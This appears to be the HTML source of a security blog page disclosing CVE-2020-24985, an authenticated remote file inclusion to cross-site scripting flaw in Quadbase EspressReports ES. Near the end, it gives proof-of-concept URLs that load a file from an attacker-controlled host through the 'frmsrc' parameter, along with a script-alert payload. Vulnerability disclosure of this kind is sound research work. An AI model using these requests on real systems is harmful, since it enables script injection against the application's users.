		@media screen and (min-width: 56.875em) {
			.main-navigation ul ul li {
				background-color: #f4f4f4;
			}

			.main-navigation ul ul:after {
				border-top-color: #f4f4f4;
				border-bottom-color: #f4f4f4;
			}
		}
	

		/* Custom Link Color */
		.menu-toggle:hover,
		.menu-toggle:focus,
		a,
		.main-navigation a:hover,
		.main-navigation a:focus,
		.dropdown-toggle:hover,
		.dropdown-toggle:focus,
		.social-navigation a:hover:before,
		.social-navigation a:focus:before,
		.post-navigation a:hover .post-title,
		.post-navigation a:focus .post-title,
		.tagcloud a:hover,
		.tagcloud a:focus,
		.site-branding .site-title a:hover,
		.site-branding .site-title a:focus,
		.entry-title a:hover,
		.entry-title a:focus,
		.entry-footer a:hover,
		.entry-footer a:focus,
		.comment-metadata a:hover,
		.comment-metadata a:focus,
		.pingback .comment-edit-link:hover,
		.pingback .comment-edit-link:focus,
		.comment-reply-link,
		.comment-reply-link:hover,
		.comment-reply-link:focus,
		.required,
		.site-info a:hover,
		.site-info a:focus {
			color: #0088ff;
		}

		mark,
		ins,
		button:hover,
		button:focus,
		input[type="button"]:hover,
		input[type="button"]:focus,
		input[type="reset"]:hover,
		input[type="reset"]:focus,
		input[type="submit"]:hover,
		input[type="submit"]:focus,
		.pagination .prev:hover,
		.pagination .prev:focus,
		.pagination .next:hover,
		.pagination .next:focus,
		.widget_calendar tbody a,
		.page-links a:hover,
		.page-links a:focus {
			background-color: #0088ff;
		}

		input[type="date"]:focus,
		input[type="time"]:focus,
		input[type="datetime-local"]:focus,
		input[type="week"]:focus,
		input[type="month"]:focus,
		input[type="text"]:focus,
		input[type="email"]:focus,
		input[type="url"]:focus,
		input[type="password"]:focus,
		input[type="search"]:focus,
		input[type="tel"]:focus,
		input[type="number"]:focus,
		textarea:focus,
		.tagcloud a:hover,
		.tagcloud a:focus,
		.menu-toggle:hover,
		.menu-toggle:focus {
			border-color: #0088ff;
		}

		@media screen and (min-width: 56.875em) {
			.main-navigation li:hover > a,
			.main-navigation li.focus > a {
				color: #0088ff;
			}
		}
	

		/* Custom Main Text Color */
		body,
		blockquote cite,
		blockquote small,
		.main-navigation a,
		.menu-toggle,
		.dropdown-toggle,
		.social-navigation a,
		.post-navigation a,
		.pagination a:hover,
		.pagination a:focus,
		.widget-title a,
		.site-branding .site-title a,
		.entry-title a,
		.page-links > .page-links-title,
		.comment-author,
		.comment-reply-title small a:hover,
		.comment-reply-title small a:focus {
			color: #2d2d2d
		}

		blockquote,
		.menu-toggle.toggled-on,
		.menu-toggle.toggled-on:hover,
		.menu-toggle.toggled-on:focus,
		.post-navigation,
		.post-navigation div + div,
		.pagination,
		.widget,
		.page-header,
		.page-links a,
		.comments-title,
		.comment-reply-title {
			border-color: #2d2d2d;
		}

		button,
		button[disabled]:hover,
		button[disabled]:focus,
		input[type="button"],
		input[type="button"][disabled]:hover,
		input[type="button"][disabled]:focus,
		input[type="reset"],
		input[type="reset"][disabled]:hover,
		input[type="reset"][disabled]:focus,
		input[type="submit"],
		input[type="submit"][disabled]:hover,
		input[type="submit"][disabled]:focus,
		.menu-toggle.toggled-on,
		.menu-toggle.toggled-on:hover,
		.menu-toggle.toggled-on:focus,
		.pagination:before,
		.pagination:after,
		.pagination .prev,
		.pagination .next,
		.page-links a {
			background-color: #2d2d2d;
		}

		/* Border Color */
		fieldset,
		pre,
		abbr,
		acronym,
		table,
		th,
		td,
		input[type="date"],
		input[type="time"],
		input[type="datetime-local"],
		input[type="week"],
		input[type="month"],
		input[type="text"],
		input[type="email"],
		input[type="url"],
		input[type="password"],
		input[type="search"],
		input[type="tel"],
		input[type="number"],
		textarea,
		.main-navigation li,
		.main-navigation .primary-menu,
		.menu-toggle,
		.dropdown-toggle:after,
		.social-navigation a,
		.image-navigation,
		.comment-navigation,
		.tagcloud a,
		.entry-content,
		.entry-summary,
		.page-links a,
		.page-links > span,
		.comment-list article,
		.comment-list .pingback,
		.comment-list .trackback,
		.comment-reply-link,
		.no-comments,
		.widecolumn .mu_register .mu_alert {
			border-color: #2d2d2d; /* Fallback for IE7 and IE8 */
			border-color: rgba( 45, 45, 45, 0.2);
		}

		hr,
		code {
			background-color: #2d2d2d; /* Fallback for IE7 and IE8 */
			background-color: rgba( 45, 45, 45, 0.2);
		}

		@media screen and (min-width: 56.875em) {
			.main-navigation ul ul,
			.main-navigation ul ul li {
				border-color: rgba( 45, 45, 45, 0.2);
			}

			.main-navigation ul ul:before {
				border-top-color: rgba( 45, 45, 45, 0.2);
				border-bottom-color: rgba( 45, 45, 45, 0.2);
			}
		}
	

		/* Custom Secondary Text Color */

		/**
		 * IE8 and earlier will drop any block with CSS3 selectors.
		 * Do not combine these styles with the next block.
		 */
		body:not(.search-results) .entry-summary {
			color: #303030;
		}

		blockquote,
		.post-password-form label,
		a:hover,
		a:focus,
		a:active,
		.post-navigation .meta-nav,
		.image-navigation,
		.comment-navigation,
		.widget_recent_entries .post-date,
		.widget_rss .rss-date,
		.widget_rss cite,
		.site-description,
		.author-bio,
		.entry-footer,
		.entry-footer a,
		.sticky-post,
		.taxonomy-description,
		.entry-caption,
		.comment-metadata,
		.pingback .edit-link,
		.comment-metadata a,
		.pingback .comment-edit-link,
		.comment-form label,
		.comment-notes,
		.comment-awaiting-moderation,
		.logged-in-as,
		.form-allowed-tags,
		.site-info,
		.site-info a,
		.wp-caption .wp-caption-text,
		.gallery-caption,
		.widecolumn label,
		.widecolumn .mu_register label {
			color: #303030;
		}

		.widget_calendar tbody a:hover,
		.widget_calendar tbody a:focus {
			background-color: #303030;
		}
	
</style>
<link rel='stylesheet' id='twentysixteen-block-style-css'  href='https://c41nc.co.uk/wp-content/themes/twentysixteen/css/blocks.css?ver=20190102' media='all' />
<!--[if lt IE 10]>
<link rel='stylesheet' id='twentysixteen-ie-css'  href='https://c41nc.co.uk/wp-content/themes/twentysixteen/css/ie.css?ver=20170530' media='all' />
<![endif]-->
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentysixteen-ie8-css'  href='https://c41nc.co.uk/wp-content/themes/twentysixteen/css/ie8.css?ver=20170530' media='all' />
<![endif]-->
<!--[if lt IE 8]>
<link rel='stylesheet' id='twentysixteen-ie7-css'  href='https://c41nc.co.uk/wp-content/themes/twentysixteen/css/ie7.css?ver=20170530' media='all' />
<![endif]-->
<script src='https://c41nc.co.uk/wp-includes/js/jquery/jquery.min.js?ver=3.5.1' id='jquery-core-js'></script>
<script src='https://c41nc.co.uk/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script src='https://c41nc.co.uk/wp-content/plugins/feed-them-social/feeds/js/powered-by.js?ver=2.9.6.5' id='fts_powered_by_js-js'></script>
<script id='fts-global-js-extra'>
var fts_twitter_ajax = {"ajax_url":"https:\/\/c41nc.co.uk\/wp-admin\/admin-ajax.php"};
var fts_twitter_ajax = {"ajax_url":"https:\/\/c41nc.co.uk\/wp-admin\/admin-ajax.php"};
</script>
<script src='https://c41nc.co.uk/wp-content/plugins/feed-them-social/feeds/js/fts-global.js?ver=2.9.6.5' id='fts-global-js'></script>
<!--[if lt IE 9]>
<script src='https://c41nc.co.uk/wp-content/themes/twentysixteen/js/html5.js?ver=3.7.3' id='twentysixteen-html5-js'></script>
<![endif]-->

<!-- Google Analytics snippet added by Site Kit -->
<script src='https://www.googletagmanager.com/gtag/js?id=UA-134344273-1' id='google_gtagjs-js' async></script>
<script id='google_gtagjs-js-after'>
window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
gtag('set', 'linker', {"domains":["c41nc.co.uk"]} );
gtag("js", new Date());
gtag("set", "developer_id.dZTNiMT", true);
gtag("config", "UA-134344273-1", {"anonymize_ip":true});
</script>

<!-- End Google Analytics snippet added by Site Kit -->
<link rel="https://api.w.org/" href="https://c41nc.co.uk/wp-json/" /><link rel="alternate" type="application/json" href="https://c41nc.co.uk/wp-json/wp/v2/pages/113" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://c41nc.co.uk/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://c41nc.co.uk/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7.3" />
<link rel="canonical" href="https://c41nc.co.uk/cve-2020-24985/" />
<link rel='shortlink' href='https://c41nc.co.uk/?p=113' />
<link rel="alternate" type="application/json+oembed" href="https://c41nc.co.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fc41nc.co.uk%2Fcve-2020-24985%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://c41nc.co.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fc41nc.co.uk%2Fcve-2020-24985%2F&#038;format=xml" />
<meta name="generator" content="Site Kit by Google 1.44.0" /><meta name="google-site-verification" content="hDd0yDUFDgiu9pRvG-rytTL1U7oKrDX2uQuC1KloipU">
<!-- Google AdSense snippet added by Site Kit -->
<meta name="google-adsense-platform-account" content="ca-host-pub-2644536267352236">
<meta name="google-adsense-platform-domain" content="sitekit.withgoogle.com">
<!-- End Google AdSense snippet added by Site Kit -->
<style id="custom-background-css">
body.custom-background { background-color: #0a0a0a; }
</style>
	</head>

<body data-rsssl=1 class="page-template-default page page-id-113 custom-background wp-embed-responsive no-sidebar">
<div id="page" class="site">
	<div class="site-inner">
		<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

		<header id="masthead" class="site-header" role="banner">
			<div class="site-header-main">
				<div class="site-branding">
					
											<p class="site-title"><a href="https://c41nc.co.uk/" rel="home">C41NC</a></p>
												<p class="site-description">Security site.</p>
									</div><!-- .site-branding -->

									<button id="menu-toggle" class="menu-toggle">Menu</button>

					<div id="site-header-menu" class="site-header-menu">
													<nav id="site-navigation" class="main-navigation" role="navigation" aria-label="Primary Menu">
								<div class="menu-menu-container"><ul id="menu-menu" class="primary-menu"><li id="menu-item-28" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-28"><a href="https://c41nc.co.uk/cowrie-cheat-sheet/">Cowrie Cheat Sheet</a></li>
<li id="menu-item-29" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-29"><a href="https://c41nc.co.uk/wifi-cheat-sheet/">WiFi Cheat Sheet</a></li>
<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a href="https://c41nc.co.uk/2018-in-review/">2018 In Review</a></li>
<li id="menu-item-36" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36"><a href="https://c41nc.co.uk/uart-to-pi-using-ubuntu/">Connecting to Pi Zero Using UART.</a></li>
<li id="menu-item-48" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-48"><a href="https://c41nc.co.uk/backdoor-a-gl-inet-mini-router/">Backdoor a GL.Inet mini router.</a></li>
<li id="menu-item-63" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-63"><a href="https://c41nc.co.uk/how-i-found-my-first-cve/">How I Found My First CVE</a></li>
<li id="menu-item-76" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-76"><a href="https://c41nc.co.uk/cve-2020-24983/">CVE-2020-24983</a></li>
<li id="menu-item-81" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81"><a href="https://c41nc.co.uk/cve-2020-24984/">CVE-2020-24984</a></li>
<li id="menu-item-90" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-90"><a href="https://c41nc.co.uk/cve-2020-28150/">CVE-2020-28150</a></li>
<li id="menu-item-104" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-104"><a href="https://c41nc.co.uk/cve-2020-28149/">CVE-2020-28149</a></li>
<li id="menu-item-111" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-111"><a href="https://c41nc.co.uk/cve-2020-24982/">CVE-2020-24982</a></li>
<li id="menu-item-120" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-113 current_page_item menu-item-120"><a href="https://c41nc.co.uk/cve-2020-24985/" aria-current="page">CVE-2020-24985</a></li>
</ul></div>							</nav><!-- .main-navigation -->
						
											</div><!-- .site-header-menu -->
							</div><!-- .site-header-main -->

					</header><!-- .site-header -->

		<div id="content" class="site-content">

<div id="primary" class="content-area">
	<main id="main" class="site-main" role="main">
		
<article id="post-113" class="post-113 page type-page status-publish hentry">
	<header class="entry-header">
		<h1 class="entry-title">CVE-2020-24985</h1>	</header><!-- .entry-header -->

	
	<div class="entry-content">
		
<p><em>Quadbase – EspressReports ES – Version 7, Update 9 – Authenticated Remote File Inclusion (RFI) to Cross Site Scripting (XSS)</em></p>



<p>An authenticated user is able to navigate to the “MenuPage” section of the application, located: /ERES/MenuPage/MenuPage.jsp. Via the menu a dashboard file can be loaded.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="604" height="286" src="https://c41nc.co.uk/wp-content/uploads/2021/03/image-2.png" alt="" class="wp-image-115" srcset="https://c41nc.co.uk/wp-content/uploads/2021/03/image-2.png 604w, https://c41nc.co.uk/wp-content/uploads/2021/03/image-2-300x142.png 300w" sizes="(max-width: 604px) 85vw, 604px" /><figcaption>The ERES dashboard as viewed by a standard user.</figcaption></figure>



<p>By viewing the sourced code of MenuPage.jsp, a parameter can be identified called ‘frmsrc’. The value held in this parameter is loaded into the JSP and all HTML is escaped. This is then set to the value of the MenuPage.frameSrc. These files are then loaded into the same location as the dashboard above.</p>



<p>By using the ‘frmsrc’ parameter, we were able to perform a remote request to an attacker-controlled server and load in a malicious html file. This was achieved using the following URL:</p>



<p><a href="http://tomcatserver:8080/ERES/MenuPage/MenuPage.jsp?frmsrc=http://attacker:8081/poc.html">http://tomcatserver:8080/ERES/MenuPage/MenuPage.jsp?frmsrc=http://attacker:8081/poc.html</a></p>



<figure class="wp-block-image size-large"><img loading="lazy" width="604" height="312" src="https://c41nc.co.uk/wp-content/uploads/2021/03/image-4.png" alt="" class="wp-image-117" srcset="https://c41nc.co.uk/wp-content/uploads/2021/03/image-4.png 604w, https://c41nc.co.uk/wp-content/uploads/2021/03/image-4-300x155.png 300w" sizes="(max-width: 604px) 85vw, 604px" /><figcaption>XSS payload rendered within the application</figcaption></figure>



<p>Figure 2 shows the result of loading in a html file which includes an XSS payload. Examining the source code, we can see that the iframe src now points to the attacker’s server.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="604" height="56" src="https://c41nc.co.uk/wp-content/uploads/2021/03/image-5.png" alt="" class="wp-image-118" srcset="https://c41nc.co.uk/wp-content/uploads/2021/03/image-5.png 604w, https://c41nc.co.uk/wp-content/uploads/2021/03/image-5-300x28.png 300w" sizes="(max-width: 604px) 85vw, 604px" /></figure>



<p>Figure 3 &#8211; iframe src now equals the attacker&#8217;s server.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="601" height="71" src="https://c41nc.co.uk/wp-content/uploads/2021/03/image-6.png" alt="" class="wp-image-119" srcset="https://c41nc.co.uk/wp-content/uploads/2021/03/image-6.png 601w, https://c41nc.co.uk/wp-content/uploads/2021/03/image-6-300x35.png 300w" sizes="(max-width: 601px) 85vw, 601px" /></figure>



<p>Figure 4 &#8211; Attacker controlled server, receiving the RFI request.</p>



<p>POC:</p>



<p><code>&lt;script>alert("RFI to XSS");&lt;/script></code></p>



<p><a href="http://192.168.1.224:8080/ERES/MenuPage/MenuPage.jsp?frmsrc=http://192.168.1.225:8081/poc.html">http://192.168.1.224:8080/ERES/MenuPage/MenuPage.jsp?frmsrc=http://192.168.1.225:8081/poc.html</a></p>
	</div><!-- .entry-content -->

	
</article><!-- #post-113 -->

	</main><!-- .site-main -->

	
</div><!-- .content-area -->



		</div><!-- .site-content -->

		<footer id="colophon" class="site-footer" role="contentinfo">
							<nav class="main-navigation" role="navigation" aria-label="Footer Primary Menu">
					<div class="menu-menu-container"><ul id="menu-menu-1" class="primary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-28"><a href="https://c41nc.co.uk/cowrie-cheat-sheet/">Cowrie Cheat Sheet</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-29"><a href="https://c41nc.co.uk/wifi-cheat-sheet/">WiFi Cheat Sheet</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a href="https://c41nc.co.uk/2018-in-review/">2018 In Review</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-36"><a href="https://c41nc.co.uk/uart-to-pi-using-ubuntu/">Connecting to Pi Zero Using UART.</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-48"><a href="https://c41nc.co.uk/backdoor-a-gl-inet-mini-router/">Backdoor a GL.Inet mini router.</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-63"><a href="https://c41nc.co.uk/how-i-found-my-first-cve/">How I Found My First CVE</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-76"><a href="https://c41nc.co.uk/cve-2020-24983/">CVE-2020-24983</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81"><a href="https://c41nc.co.uk/cve-2020-24984/">CVE-2020-24984</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-90"><a href="https://c41nc.co.uk/cve-2020-28150/">CVE-2020-28150</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-104"><a href="https://c41nc.co.uk/cve-2020-28149/">CVE-2020-28149</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-111"><a href="https://c41nc.co.uk/cve-2020-24982/">CVE-2020-24982</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-113 current_page_item menu-item-120"><a href="https://c41nc.co.uk/cve-2020-24985/" aria-current="page">CVE-2020-24985</a></li>
</ul></div>				</nav><!-- .main-navigation -->
			
			
			<div class="site-info">
								<span class="site-title"><a href="https://c41nc.co.uk/" rel="home">C41NC</a></span>
								<a href="https://wordpress.org/" class="imprint">
					Proudly powered by WordPress				</a>
			</div><!-- .site-info -->
		</footer><!-- .site-footer -->
	</div><!-- .site-inner -->
</div><!-- .site -->

<script src='https://c41nc.co.uk/wp-content/themes/twentysixteen/js/skip-link-focus-fix.js?ver=20170530' id='twentysixteen-skip-link-focus-fix-js'></script>
<script id='twentysixteen-script-js-extra'>
var screenReaderText = {"expand":"expand child menu","collapse":"collapse child menu"};
</script>
<script src='https://c41nc.co.uk/wp-content/themes/twentysixteen/js/functions.js?ver=20181217' id='twentysixteen-script-js'></script>
<script src='https://c41nc.co.uk/wp-includes/js/wp-embed.min.js?ver=5.7.3' id='wp-embed-js'></script>
</body>
</html>
